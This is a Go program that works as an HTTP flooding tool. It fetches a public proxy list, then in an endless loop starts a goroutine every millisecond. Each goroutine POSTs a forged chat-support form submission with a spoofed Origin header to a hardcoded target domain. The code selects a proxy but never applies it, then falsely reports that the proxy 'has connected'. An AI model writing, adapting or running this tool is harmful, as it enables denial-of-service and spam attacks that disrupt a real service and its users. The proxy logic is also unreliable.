package main

import (
	"bufio"
	"fmt"
	"math/rand" // Import the "math/rand" package
	"net/http"
	"time"

	"github.com/google/uuid"
	"github.com/valyala/fasthttp"
)

var proxyList []string

func main() {
	// Fetch proxy list from an API
	proxyList = fetchProxyList()
	if len(proxyList) == 0 {
		fmt.Println("No proxies available.")
		return
	}

	for {
		go flooder()
		time.Sleep(time.Millisecond * 1)
	}
}

func fetchProxyList() []string {
	// Replace this with your proxy API endpoint
	proxyAPIURL := "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"

	resp, err := http.Get(proxyAPIURL)
	if err != nil {
		fmt.Printf("Error fetching proxy list: %s\n", err)
		return []string{}
	}
	defer resp.Body.Close()

	var proxies []string
	scanner := bufio.NewScanner(resp.Body)
	for scanner.Scan() {
		proxies = append(proxies, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		fmt.Printf("Error reading proxy list: %s\n", err)
	}

	return proxies
}

func flooder() {
	url := "https://cfcybernews.eu" // Replace with your API endpoint
	uid, err := uuid.NewUUID()
	if err != nil {
		fmt.Printf("Error generating UUID: %s\n", err)
		return
	}

	// Randomly select a proxy from the proxy list
	proxy := proxyList[rand.Intn(len(proxyList))]
	data := "customerName=dsd&entrance=Chatt%20UL&errand=200&sourceUrl=https%3A%2F%2Fwww.ul.se%2F&visitorUserAgent=Mozilla%252F5.0%2520(X11%253B%2520CrOS%2520x86_64%252014541.0.0)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F118.0.0.0%2520Safari%252F537.36&visitorQuestion=sd&videoChatMode=disabled&protocolVersion=A&instance=Jy0RpKJs&uid=" + uid.String()

	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()

	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	req.Header.SetMethod("POST")
	req.Header.Set("Origin", "https://www.ul.se")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.SetRequestURI(url)
	req.SetBodyString(data)

	if err := fasthttp.Do(req, resp); err != nil {
		fmt.Printf("Error: %s\n", err)
		return
	}

	// Print the response status code and body
	fmt.Println("[+]", proxy, "has connected")
}
